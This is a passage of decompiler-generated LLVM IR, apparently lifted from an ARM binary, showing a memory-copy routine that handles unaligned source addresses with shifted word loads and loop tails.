  %v1_10504 = urem i32 %v0_10504, 4
  store i32 %v1_10504, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_10504 = icmp eq i32 %v1_10504, 0
  store i1 %v2_10504, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_10504 to i2
  br i1 %v2_10504, label %dec_label_pc_10438, label %dec_label_pc_1050c

dec_label_pc_1050c:                               ; preds = %dec_label_pc_10430, %dec_label_pc_10504
  %v0_1062c76 = phi i32 [ %v1_10410, %dec_label_pc_10430 ], [ %v0_1062c77, %dec_label_pc_10504 ]
  %v0_10594 = phi i32 [ %v2_10420, %dec_label_pc_10430 ], [ %v2_104fc, %dec_label_pc_10504 ]
  %v0_10514.off0 = phi i2 [ %extract.t, %dec_label_pc_10430 ], [ %extract.t131, %dec_label_pc_10504 ]
  %v0_1050c = phi i32 [ %v0_10410, %dec_label_pc_10430 ], [ %v0_10504, %dec_label_pc_10504 ]
  %v1_1050c = and i32 %v0_1050c, -4
  store i32 %v1_1050c, i32* %r1.global-to-local, align 4
  %v1_10510 = inttoptr i32 %v1_1050c to i32*
  %v2_10510 = load i32, i32* %v1_10510, align 4
  store i32 %v2_10510, i32* %lr.global-to-local, align 4
  %v4_10510 = add i32 %v1_1050c, 4
  store i32 %v4_10510, i32* %r1.global-to-local, align 4
  %v1_1058c = add i32 %v0_10594, -12
  %v3_1058c = sub i32 11, %v0_10594
  %v4_1058c = and i32 %v3_1058c, %v0_10594
  %v5_1058c = icmp slt i32 %v4_1058c, 0
  store i1 %v5_1058c, i1* %cpsr_v.global-to-local, align 1
  %v6_1058c = icmp slt i32 %v1_1058c, 0
  store i1 %v6_1058c, i1* %cpsr_n.global-to-local, align 1
  %v7_1058c = icmp eq i32 %v0_10594, 12
  store i1 %v7_1058c, i1* %cpsr_z.global-to-local, align 1
  %v2_10590 = xor i1 %v6_1058c, %v5_1058c
  switch i2 %v0_10514.off0, label %dec_label_pc_10520 [
    i2 -1, label %dec_label_pc_105f8
    i2 -2, label %dec_label_pc_1058c
  ]

dec_label_pc_10520:                               ; preds = %dec_label_pc_1050c
  br i1 %v2_10590, label %dec_label_pc_1056c, label %dec_label_pc_10528

dec_label_pc_10528:                               ; preds = %dec_label_pc_10520
  store i32 %v1_1058c, i32* %r2.global-to-local, align 4
  %v3_1052c = load i32, i32* @r4, align 4
  store i32 %v3_1052c, i32* %stack_var_-16, align 4
  %v6_1052c = load i32, i32* @r5, align 4
  store i32 %v6_1052c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10530

dec_label_pc_10530:                               ; preds = %dec_label_pc_10530.dec_label_pc_10530_crit_edge, %dec_label_pc_10528
  %v0_10554 = phi i32 [ %v12_10554, %dec_label_pc_10530.dec_label_pc_10530_crit_edge ], [ %v0_1062c76, %dec_label_pc_10528 ]
  %v0_10534 = phi i32 [ %v0_10534.pre, %dec_label_pc_10530.dec_label_pc_10530_crit_edge ], [ %v4_10510, %dec_label_pc_10528 ]
  %v0_10530 = phi i32 [ %v0_10530.pre, %dec_label_pc_10530.dec_label_pc_10530_crit_edge ], [ %v2_10510, %dec_label_pc_10528 ]
  %v3_10530 = udiv i32 %v0_10530, 256
  %v1_10534 = inttoptr i32 %v0_10534 to i32*
  %v2_10534 = load i32, i32* %v1_10534, align 4
  store i32 %v2_10534, i32* %r4.global-to-local, align 4
  %v3_10534 = add i32 %v0_10534, 4
  %v4_10534 = inttoptr i32 %v3_10534 to i32*
  %v5_10534 = load i32, i32* %v4_10534, align 4
  store i32 %v5_10534, i32* %r5.global-to-local, align 4
  %v6_10534 = add i32 %v0_10534, 8
  %v7_10534 = inttoptr i32 %v6_10534 to i32*
  %v8_10534 = load i32, i32* %v7_10534, align 4
  store i32 %v8_10534, i32* %ip.global-to-local, align 4
  %v9_10534 = add i32 %v0_10534, 12
  %v10_10534 = inttoptr i32 %v9_10534 to i32*
  %v11_10534 = load i32, i32* %v10_10534, align 4
  store i32 %v11_10534, i32* %lr.global-to-local, align 4
  %v12_10534 = add i32 %v0_10534, 16
  store i32 %v12_10534, i32* %r1.global-to-local, align 4
  %v4_10538 = mul i32 %v2_10534, 16777216
  %v5_10538 = or i32 %v4_10538, %v3_10530
  store i32 %v5_10538, i32* @r3, align 4
  %v3_1053c = udiv i32 %v2_10534, 256
  %v4_10540 = mul i32 %v5_10534, 16777216
  %v5_10540 = or i32 %v4_10540, %v3_1053c
  store i32 %v5_10540, i32* %r4.global-to-local, align 4
  %v3_10544 = udiv i32 %v5_10534, 256
  %v4_10548 = mul i32 %v8_10534, 16777216
  %v5_10548 = or i32 %v4_10548, %v3_10544
  store i32 %v5_10548, i32* %r5.global-to-local, align 4
  %v3_1054c = udiv i32 %v8_10534, 256
  %v4_10550 = mul i32 %v11_10534, 16777216
  %v5_10550 = or i32 %v4_10550, %v3_1054c
  store i32 %v5_10550, i32* @ip, align 4
  %v1_10554 = inttoptr i32 %v0_10554 to i32*
  store i32 %v5_10538, i32* %v1_10554, align 4
  %v3_10554 = add i32 %v0_10554, 4
  %v4_10554 = inttoptr i32 %v3_10554 to i32*
  %v5_10554 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10554, i32* %v4_10554, align 4
  %v6_10554 = add i32 %v0_10554, 8
  %v7_10554 = inttoptr i32 %v6_10554 to i32*
  %v8_10554 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_10554, i32* %v7_10554, align 4
  %v9_10554 = add i32 %v0_10554, 12
  %v10_10554 = inttoptr i32 %v9_10554 to i32*
  %v11_10554 = load i32, i32* @ip, align 4
  store i32 %v11_10554, i32* %v10_10554, align 4
  %v12_10554 = add i32 %v0_10554, 16
  store i32 %v12_10554, i32* %r0.global-to-local, align 4
  %v0_10558 = load i32, i32* %r2.global-to-local, align 4
  %v1_10558 = add i32 %v0_10558, -16
  store i32 %v1_10558, i32* %r2.global-to-local, align 4
  %v3_10558 = sub i32 15, %v0_10558
  %v4_10558 = and i32 %v3_10558, %v0_10558
  %v5_10558 = icmp slt i32 %v4_10558, 0
  %v6_10558 = icmp slt i32 %v1_10558, 0
  %v2_1055c = xor i1 %v6_10558, %v5_10558
  br i1 %v2_1055c, label %dec_label_pc_10560, label %dec_label_pc_10530.dec_label_pc_10530_crit_edge

dec_label_pc_10530.dec_label_pc_10530_crit_edge:  ; preds = %dec_label_pc_10530
  %v0_10530.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10530

dec_label_pc_10560:                               ; preds = %dec_label_pc_10530
  %v2_10560 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10560, i32* @r4, align 4
  %v5_10560 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_10560, i32* @r5, align 4
  %v1_10564 = add i32 %v0_10558, -4
  store i32 %v1_10564, i32* %r2.global-to-local, align 4
  %v3_10564 = add i32 %v0_10558, 2147483632
  %v4_10564 = and i32 %v1_10564, %v3_10564
  %v5_10564 = icmp slt i32 %v4_10564, 0
  store i1 %v5_10564, i1* %cpsr_v.global-to-local, align 1
  %v6_10564 = icmp slt i32 %v1_10564, 0
  store i1 %v6_10564, i1* %cpsr_n.global-to-local, align 1
  %v7_10564 = icmp eq i32 %v1_10564, 0
  store i1 %v7_10564, i1* %cpsr_z.global-to-local, align 1
  %v2_10568 = xor i1 %v6_10564, %v5_10564
  br i1 %v2_10568, label %dec_label_pc_10584, label %dec_label_pc_1056c

dec_label_pc_1056c:                               ; preds = %dec_label_pc_10560, %dec_label_pc_10520, %dec_label_pc_1056c
  %v1_10578 = phi i32 [ %v4_10578, %dec_label_pc_1056c ], [ %v12_10554, %dec_label_pc_10560 ], [ %v0_1062c76, %dec_label_pc_10520 ]
  %v0_1056c = load i32, i32* %lr.global-to-local, align 4
  %v3_1056c = udiv i32 %v0_1056c, 256
  store i32 %v3_1056c, i32* %ip.global-to-local, align 4
  %v0_10570 = load i32, i32* %r1.global-to-local, align 4
  %v1_10570 = inttoptr i32 %v0_10570 to i32*
  %v2_10570 = load i32, i32* %v1_10570, align 4
  store i32 %v2_10570, i32* %lr.global-to-local, align 4
  %v4_10570 = add i32 %v0_10570, 4
  store i32 %v4_10570, i32* %r1.global-to-local, align 4
  %v4_10574 = mul i32 %v2_10570, 16777216
  %v5_10574 = or i32 %v4_10574, %v3_1056c
  store i32 %v5_10574, i32* @ip, align 4
  %v2_10578 = inttoptr i32 %v1_10578 to i32*
  store i32 %v5_10574, i32* %v2_10578, align 4
  %v3_10578 = load i32, i32* %r0.global-to-local, align 4
  %v4_10578 = add i32 %v3_10578, 4
  store i32 %v4_10578, i32* %r0.global-to-local, align 4
  %v0_1057c = load i32, i32* %r2.global-to-local, align 4
  %v1_1057c = add i32 %v0_1057c, -4
  store i32 %v1_1057c, i32* %r2.global-to-local, align 4
  %v3_1057c = sub i32 3, %v0_1057c
  %v4_1057c = and i32 %v3_1057c, %v0_1057c
  %v5_1057c = icmp slt i32 %v4_1057c, 0
  %v6_1057c = icmp slt i32 %v1_1057c, 0
  %v2_10580 = xor i1 %v6_1057c, %v5_1057c
  br i1 %v2_10580, label %dec_label_pc_10584.loopexit, label %dec_label_pc_1056c

dec_label_pc_10584.loopexit:                      ; preds = %dec_label_pc_1056c
  %v7_1057c = icmp eq i32 %v0_1057c, 4
  store i1 %v5_1057c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1057c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1057c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10584

dec_label_pc_10584:                               ; preds = %dec_label_pc_10584.loopexit, %dec_label_pc_10560
  %v0_104ac59 = phi i32 [ %v1_1057c, %dec_label_pc_10584.loopexit ], [ %v1_10564, %dec_label_pc_10560 ]
  %v0_10584 = load i32, i32* %r1.global-to-local, align 4
  %v1_10584 = add i32 %v0_10584, -3
  store i32 %v1_10584, i32* @r1, align 4
  br label %bb141

dec_label_pc_1058c:                               ; preds = %dec_label_pc_1050c
  br i1 %v2_10590, label %dec_label_pc_105d8, label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_1058c
  store i32 %v1_1058c, i32* %r2.global-to-local, align 4
  %v3_10598 = load i32, i32* @r4, align 4
  store i32 %v3_10598, i32* %stack_var_-16, align 4
  %v6_10598 = load i32, i32* @r5, align 4
  store i32 %v6_10598, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1059c

dec_label_pc_1059c:                               ; preds = %dec_label_pc_1059c.dec_label_pc_1059c_crit_edge, %dec_label_pc_10594
  %v0_105c0 = phi i32 [ %v12_105c0, %dec_label_pc_1059c.dec_label_pc_1059c_crit_edge ], [ %v0_1062c76, %dec_label_pc_10594 ]
  %v0_105a0 = phi i32 [ %v0_105a0.pre, %dec_label_pc_1059c.dec_label_pc_1059c_crit_edge ], [ %v4_10510, %dec_label_pc_10594 ]
  %v0_1059c = phi i32 [ %v0_1059c.pre, %dec_label_pc_1059c.dec_label_pc_1059c_crit_edge ], [ %v2_10510, %dec_label_pc_10594 ]
  %v3_1059c = udiv i32 %v0_1059c, 65536
  %v1_105a0 = inttoptr i32 %v0_105a0 to i32*
  %v2_105a0 = load i32, i32* %v1_105a0, align 4
  store i32 %v2_105a0, i32* %r4.global-to-local, align 4
  %v3_105a0 = add i32 %v0_105a0, 4
  %v4_105a0 = inttoptr i32 %v3_105a0 to i32*
  %v5_105a0 = load i32, i32* %v4_105a0, align 4
  store i32 %v5_105a0, i32* %r5.global-to-local, align 4
  %v6_105a0 = add i32 %v0_105a0, 8
  %v7_105a0 = inttoptr i32 %v6_105a0 to i32*
  %v8_105a0 = load i32, i32* %v7_105a0, align 4
  store i32 %v8_105a0, i32* %ip.global-to-local, align 4
  %v9_105a0 = add i32 %v0_105a0, 12
  %v10_105a0 = inttoptr i32 %v9_105a0 to i32*
  %v11_105a0 = load i32, i32* %v10_105a0, align 4
  store i32 %v11_105a0, i32* %lr.global-to-local, align 4
  %v12_105a0 = add i32 %v0_105a0, 16
  store i32 %v12_105a0, i32* %r1.global-to-local, align 4
  %v4_105a4 = mul i32 %v2_105a0, 65536
  %v5_105a4 = or i32 %v4_105a4, %v3_1059c
  store i32 %v5_105a4, i32* @r3, align 4
  %v3_105a8 = udiv i32 %v2_105a0, 65536
  %v4_105ac = mul i32 %v5_105a0, 65536
  %v5_105ac = or i32 %v4_105ac, %v3_105a8
  store i32 %v5_105ac, i32* %r4.global-to-local, align 4
  %v3_105b0 = udiv i32 %v5_105a0, 65536
  %v4_105b4 = mul i32 %v8_105a0, 65536
  %v5_105b4 = or i32 %v4_105b4, %v3_105b0
  store i32 %v5_105b4, i32* %r5.global-to-local, align 4
  %v3_105b8 = udiv i32 %v8_105a0, 65536
  %v4_105bc = mul i32 %v11_105a0, 65536
  %v5_105bc = or i32 %v4_105bc, %v3_105b8
  store i32 %v5_105bc, i32* @ip, align 4
  %v1_105c0 = inttoptr i32 %v0_105c0 to i32*
  store i32 %v5_105a4, i32* %v1_105c0, align 4
  %v3_105c0 = add i32 %v0_105c0, 4
  %v4_105c0 = inttoptr i32 %v3_105c0 to i32*
  %v5_105c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_105c0, i32* %v4_105c0, align 4
  %v6_105c0 = add i32 %v0_105c0, 8
  %v7_105c0 = inttoptr i32 %v6_105c0 to i32*
  %v8_105c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_105c0, i32* %v7_105c0, align 4
  %v9_105c0 = add i32 %v0_105c0, 12
  %v10_105c0 = inttoptr i32 %v9_105c0 to i32*
  %v11_105c0 = load i32, i32* @ip, align 4
  store i32 %v11_105c0, i32* %v10_105c0, align 4
  %v12_105c0 = add i32 %v0_105c0, 16
  store i32 %v12_105c0, i32* %r0.global-to-local, align 4
  %v0_105c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_105c4 = add i32 %v0_105c4, -16
  store i32 %v1_105c4, i32* %r2.global-to-local, align 4
  %v3_105c4 = sub i32 15, %v0_105c4
  %v4_105c4 = and i32 %v3_105c4, %v0_105c4
  %v5_105c4 = icmp slt i32 %v4_105c4, 0
  %v6_105c4 = icmp slt i32 %v1_105c4, 0
  %v2_105c8 = xor i1 %v6_105c4, %v5_105c4
  br i1 %v2_105c8, label %dec_label_pc_105cc, label %dec_label_pc_1059c.dec_label_pc_1059c_crit_edge

dec_label_pc_1059c.dec_label_pc_1059c_crit_edge:  ; preds = %dec_label_pc_1059c
  %v0_1059c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_105a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1059c

dec_label_pc_105cc:                               ; preds = %dec_label_pc_1059c
  %v2_105cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_105cc, i32* @r4, align 4
  %v5_105cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_105cc, i32* @r5, align 4
  %v1_105d0 = add i32 %v0_105c4, -4
  store i32 %v1_105d0, i32* %r2.global-to-local, align 4
  %v3_105d0 = add i32 %v0_105c4, 2147483632
  %v4_105d0 = and i32 %v1_105d0, %v3_105d0
  %v5_105d0 = icmp slt i32 %v4_105d0, 0
  store i1 %v5_105d0, i1* %cpsr_v.global-to-local, align 1
  %v6_105d0 = icmp slt i32 %v1_105d0, 0
  store i1 %v6_105d0, i1* %cpsr_n.global-to-local, align 1
  %v7_105d0 = icmp eq i32 %v1_105d0, 0
  store i1 %v7_105d0, i1* %cpsr_z.global-to-local, align 1
  %v2_105d4 = xor i1 %v6_105d0, %v5_105d0
  br i1 %v2_105d4, label %dec_label_pc_105f0, label %dec_label_pc_105d8

dec_label_pc_105d8:                               ; preds = %dec_label_pc_105cc, %dec_label_pc_1058c, %dec_label_pc_105d8
  %v1_105e4 = phi i32 [ %v4_105e4, %dec_label_pc_105d8 ], [ %v12_105c0, %dec_label_pc_105cc ], [ %v0_1062c76, %dec_label_pc_1058c ]
  %v0_105d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_105d8 = udiv i32 %v0_105d8, 65536
  store i32 %v3_105d8, i32* %ip.global-to-local, align 4
  %v0_105dc = load i32, i32* %r1.global-to-local, align 4
  %v1_105dc = inttoptr i32 %v0_105dc to i32*
  %v2_105dc = load i32, i32* %v1_105dc, align 4
  store i32 %v2_105dc, i32* %lr.global-to-local, align 4
  %v4_105dc = add i32 %v0_105dc, 4
  store i32 %v4_105dc, i32* %r1.global-to-local, align 4
  %v4_105e0 = mul i32 %v2_105dc, 65536
  %v5_105e0 = or i32 %v4_105e0, %v3_105d8
  store i32 %v5_105e0, i32* @ip, align 4
  %v2_105e4 = inttoptr i32 %v1_105e4 to i32*
  store i32 %v5_105e0, i32* %v2_105e4, align 4
  %v3_105e4 = load i32, i32* %r0.global-to-local, align 4
  %v4_105e4 = add i32 %v3_105e4, 4
  store i32 %v4_105e4, i32* %r0.global-to-local, align 4
  %v0_105e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_105e8 = add i32 %v0_105e8, -4
  store i32 %v1_105e8, i32* %r2.global-to-local, align 4
  %v3_105e8 = sub i32 3, %v0_105e8
  %v4_105e8 = and i32 %v3_105e8, %v0_105e8
  %v5_105e8 = icmp slt i32 %v4_105e8, 0
  %v6_105e8 = icmp slt i32 %v1_105e8, 0
  %v2_105ec = xor i1 %v6_105e8, %v5_105e8
  br i1 %v2_105ec, label %dec_label_pc_105f0.loopexit, label %dec_label_pc_105d8

dec_label_pc_105f0.loopexit:                      ; preds = %dec_label_pc_105d8
  %v7_105e8 = icmp eq i32 %v0_105e8, 4
  store i1 %v5_105e8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_105e8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_105e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_105f0

dec_label_pc_105f0:                               ; preds = %dec_label_pc_105f0.loopexit, %dec_label_pc_105cc
  %v0_104ac60 = phi i32 [ %v1_105e8, %dec_label_pc_105f0.loopexit ], [ %v1_105d0, %dec_label_pc_105cc ]
  %v0_105f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_105f0 = add i32 %v0_105f0, -2
  store i32 %v1_105f0, i32* @r1, align 4
  br label %bb141

dec_label_pc_105f8:                               ; preds = %dec_label_pc_1050c
  br i1 %v2_10590, label %dec_label_pc_10644, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_105f8
  store i32 %v1_1058c, i32* %r2.global-to-local, align 4
  %v3_10604 = load i32, i32* @r4, align 4
  store i32 %v3_10604, i32* %stack_var_-16, align 4
  %v6_10604 = load i32, i32* @r5, align 4
  store i32 %v6_10604, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10608

dec_label_pc_10608:                               ; preds = %dec_label_pc_10608.dec_label_pc_10608_crit_edge, %dec_label_pc_10600
  %v0_1062c = phi i32 [ %v12_1062c, %dec_label_pc_10608.dec_label_pc_10608_crit_edge ], [ %v0_1062c76, %dec_label_pc_10600 ]
  %v0_1060c = phi i32 [ %v0_1060c.pre, %dec_label_pc_10608.dec_label_pc_10608_crit_edge ], [ %v4_10510, %dec_label_pc_10600 ]
  %v0_10608 = phi i32 [ %v0_10608.pre, %dec_label_pc_10608.dec_label_pc_10608_crit_edge ], [ %v2_10510, %dec_label_pc_10600 ]
  %v3_10608 = udiv i32 %v0_10608, 16777216
  %v1_1060c = inttoptr i32 %v0_1060c to i32*
  %v2_1060c = load i32, i32* %v1_1060c, align 4
  store i32 %v2_1060c, i32* %r4.global-to-local, align 4
  %v3_1060c = add i32 %v0_1060c, 4
  %v4_1060c = inttoptr i32 %v3_1060c to i32*
  %v5_1060c = load i32, i32* %v4_1060c, align 4
  store i32 %v5_1060c, i32* %r5.global-to-local, align 4
  %v6_1060c = add i32 %v0_1060c, 8
  %v7_1060c = inttoptr i32 %v6_1060c to i32*
  %v8_1060c = load i32, i32* %v7_1060c, align 4
  store i32 %v8_1060c, i32* %ip.global-to-local, align 4
  %v9_1060c = add i32 %v0_1060c, 12
  %v10_1060c = inttoptr i32 %v9_1060c to i32*
  %v11_1060c = load i32, i32* %v10_1060c, align 4
  store i32 %v11_1060c, i32* %lr.global-to-local, align 4
  %v12_1060c = add i32 %v0_1060c, 16
  store i32 %v12_1060c, i32* %r1.global-to-local, align 4
  %v4_10610 = mul i32 %v2_1060c, 256
  %v5_10610 = or i32 %v4_10610, %v3_10608
  store i32 %v5_10610, i32* @r3, align 4
  %v3_10614 = udiv i32 %v2_1060c, 16777216
  %v4_10618 = mul i32 %v5_1060c, 256
  %v5_10618 = or i32 %v4_10618, %v3_10614
  store i32 %v5_10618, i32* %r4.global-to-local, align 4
  %v3_1061c = udiv i32 %v5_1060c, 16777216
  %v4_10620 = mul i32 %v8_1060c, 256
  %v5_10620 = or i32 %v4_10620, %v3_1061c
  store i32 %v5_10620, i32* %r5.global-to-local, align 4
  %v3_10624 = udiv i32 %v8_1060c, 16777216
  %v4_10628 = mul i32 %v11_1060c, 256
  %v5_10628 = or i32 %v4_10628, %v3_10624
  store i32 %v5_10628, i32* @ip, align 4
  %v1_1062c = inttoptr i32 %v0_1062c to i32*
  store i32 %v5_10610, i32* %v1_1062c, align 4
  %v3_1062c = add i32 %v0_1062c, 4
  %v4_1062c = inttoptr i32 %v3_1062c to i32*
  %v5_1062c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1062c, i32* %v4_1062c, align 4
  %v6_1062c = add i32 %v0_1062c, 8
  %v7_1062c = inttoptr i32 %v6_1062c to i32*
  %v8_1062c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1062c, i32* %v7_1062c, align 4
  %v9_1062c = add i32 %v0_1062c, 12
  %v10_1062c = inttoptr i32 %v9_1062c to i32*
  %v11_1062c = load i32, i32* @ip, align 4
  store i32 %v11_1062c, i32* %v10_1062c, align 4
  %v12_1062c = add i32 %v0_1062c, 16
  store i32 %v12_1062c, i32* %r0.global-to-local, align 4
  %v0_10630 = load i32, i32* %r2.global-to-local, align 4
  %v1_10630 = add i32 %v0_10630, -16
  store i32 %v1_10630, i32* %r2.global-to-local, align 4
  %v3_10630 = sub i32 15, %v0_10630
  %v4_10630 = and i32 %v3_10630, %v0_10630
  %v5_10630 = icmp slt i32 %v4_10630, 0
  %v6_10630 = icmp slt i32 %v1_10630, 0
  %v2_10634 = xor i1 %v6_10630, %v5_10630
  br i1 %v2_10634, label %dec_label_pc_10638, label %dec_label_pc_10608.dec_label_pc_10608_crit_edge

dec_label_pc_10608.dec_label_pc_10608_crit_edge:  ; preds = %dec_label_pc_10608
  %v0_10608.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1060c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10608

dec_label_pc_10638:                               ; preds = %dec_label_pc_10608
  %v2_10638 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10638, i32* @r4, align 4
  %v5_10638 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_10638, i32* @r5, align 4
  %v1_1063c = add i32 %v0_10630, -4
  store i32 %v1_1063c, i32* %r2.global-to-local, align 4
  %v3_1063c = add i32 %v0_10630, 2147483632
  %v4_1063c = and i32 %v1_1063c, %v3_1063c
  %v5_1063c = icmp slt i32 %v4_1063c, 0
  store i1 %v5_1063c, i1* %cpsr_v.global-to-local, align 1
  %v6_1063c = icmp slt i32 %v1_1063c, 0
  store i1 %v6_1063c, i1* %cpsr_n.global-to-local, align 1
  %v7_1063c = icmp eq i32 %v1_1063c, 0
  store i1 %v7_1063c, i1* %cpsr_z.global-to-local, align 1
  %v2_10640 = xor i1 %v6_1063c, %v5_1063c
  br i1 %v2_10640, label %dec_label_pc_1065c, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_10638, %dec_label_pc_105f8, %dec_label_pc_10644
  %v1_10650 = phi i32 [ %v4_10650, %dec_label_pc_10644 ], [ %v12_1062c, %dec_label_pc_10638 ], [ %v0_1062c76, %dec_label_pc_105f8 ]
  %v0_10644 = load i32, i32* %lr.global-to-local, align 4
  %v3_10644 = udiv i32 %v0_10644, 16777216
  store i32 %v3_10644, i32* %ip.global-to-local, align 4
  %v0_10648 = load i32, i32* %r1.global-to-local, align 4
  %v1_10648 = inttoptr i32 %v0_10648 to i32*
  %v2_10648 = load i32, i32* %v1_10648, align 4
  store i32 %v2_10648, i32* %lr.global-to-local, align 4
  %v4_10648 = add i32 %v0_10648, 4
  store i32 %v4_10648, i32* %r1.global-to-local, align 4
  %v4_1064c = mul i32 %v2_10648, 256
  %v5_1064c = or i32 %v4_1064c, %v3_10644
  store i32 %v5_1064c, i32* @ip, align 4
  %v2_10650 = inttoptr i32 %v1_10650 to i32*
  store i32 %v5_1064c, i32* %v2_10650, align 4
  %v3_10650 = load i32, i32* %r0.global-to-local, align 4
  %v4_10650 = add i32 %v3_10650, 4
  store i32 %v4_10650, i32* %r0.global-to-local, align 4
  %v0_10654 = load i32, i32* %r2.global-to-local, align 4
  %v1_10654 = add i32 %v0_10654, -4
  store i32 %v1_10654, i32* %r2.global-to-local, align 4
  %v3_10654 = sub i32 3, %v0_10654
  %v4_10654 = and i32 %v3_10654, %v0_10654
  %v5_10654 = icmp slt i32 %v4_10654, 0
  %v6_10654 = icmp slt i32 %v1_10654, 0
  %v2_10658 = xor i1 %v6_10654, %v5_10654
  br i1 %v2_10658, label %dec_label_pc_1065c.loopexit, label %dec_label_pc_10644

dec_label_pc_1065c.loopexit:                      ; preds = %dec_label_pc_10644
  %v7_10654 = icmp eq i32 %v0_10654, 4
  store i1 %v5_10654, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_10654, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_10654, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %dec_label_pc_1065c.loopexit, %dec_label_pc_10638
  %v0_104ac61 = phi i32 [ %v1_10654, %dec_label_pc_1065c.loopexit ], [ %v1_1063c, %dec_label_pc_10638 ]
  %v0_1065c = load i32, i32* %r1.global-to-local, align 4
  %v1_1065c = add i32 %v0_1065c, -1
  store i32 %v1_1065c, i32* @r1, align 4
  br label %bb141

dec_label_pc_10664:                               ; preds = %entry
  %v1_10664 = load i32, i32* @r2, align 4
  %v2_10664 = add i32 %v1_10664, %v0_10410
  store i32 %v2_10664, i32* @r1, align 4
  %v2_10668 = add i32 %v1_10664, %v1_10410
  store i32 %v2_10668, i32* %r0.global-to-local, align 4
  %v2_1066c = add i32 %v1_10664, -4
  store i32 %v2_1066c, i32* %r2.global-to-local, align 4
  %v4_1066c = sub i32 3, %v1_10664
  %v5_1066c = and i32 %v4_1066c, %v1_10664
  %v6_1066c = icmp slt i32 %v5_1066c, 0
  store i1 %v6_1066c, i1* %cpsr_v.global-to-local, align 1
  %v7_1066c = icmp slt i32 %v2_1066c, 0
  store i1 %v7_1066c, i1* %cpsr_n.global-to-local, align 1
  %v8_1066c = icmp eq i32 %v1_10664, 4
  store i1 %v8_1066c, i1* %cpsr_z.global-to-local, align 1
  %v5_10670 = icmp slt i32 %v1_10664, 4
  br i1 %v5_10670, label %bb151, label %dec_label_pc_10674

dec_label_pc_10674:                               ; preds = %dec_label_pc_10664
  %v1_10674 = urem i32 %v2_10668, 4
  store i32 %v1_10674, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_10674 = icmp eq i32 %v1_10674, 0
  store i1 %v2_10674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10674, label %dec_label_pc_1067c, label %dec_label_pc_1071c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10674
  %v1_1067c = urem i32 %v2_10664, 4
  store i32 %v1_1067c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1067c = icmp eq i32 %v1_1067c, 0
  store i1 %v2_1067c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1067c, label %dec_label_pc_10684, label %dec_label_pc_10748

dec_label_pc_10684:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_10740
  %v0_1069c37 = phi i32 [ %v2_10668, %dec_label_pc_1067c ], [ %v0_1079020, %dec_label_pc_10740 ]
  %v0_1069836 = phi i32 [ %v2_10664, %dec_label_pc_1067c ], [ %v0_10740, %dec_label_pc_10740 ]
  %v0_10684 = phi i32 [ %v2_1066c, %dec_label_pc_1067c ], [ %v2_10738, %dec_label_pc_10740 ]
  %v2_10684 = add i32 %v0_10684, -8
  store i32 %v2_10684, i32* %r2.global-to-local, align 4
  %v4_10684 = sub i32 7, %v0_10684
  %v5_10684 = and i32 %v4_10684, %v0_10684
  %v6_10684 = icmp slt i32 %v5_10684, 0
  store i1 %v6_10684, i1* %cpsr_v.global-to-local, align 1
  %v7_10684 = icmp slt i32 %v2_10684, 0
  store i1 %v7_10684, i1* %cpsr_n.global-to-local, align 1
  %v8_10684 = icmp eq i32 %v0_10684, 8
  store i1 %v8_10684, i1* %cpsr_z.global-to-local, align 1
  %v5_10688 = icmp slt i32 %v0_10684, 8
  br i1 %v5_10688, label %dec_label_pc_106d4, label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_10684
  %v3_1068c = load i32, i32* @r4, align 4
  %v5_1068c = inttoptr i32 %v3_1068c to i8*
  store i8* %v5_1068c, i8** %stack_var_-8, align 4
  %v8_1068c = load i32, i32* @lr, align 4
  %v2_10690 = add i32 %v0_10684, -28
  store i32 %v2_10690, i32* %r2.global-to-local, align 4
  %v4_10690 = sub i32 27, %v0_10684
  %v5_10690 = and i32 %v4_10690, %v2_10684
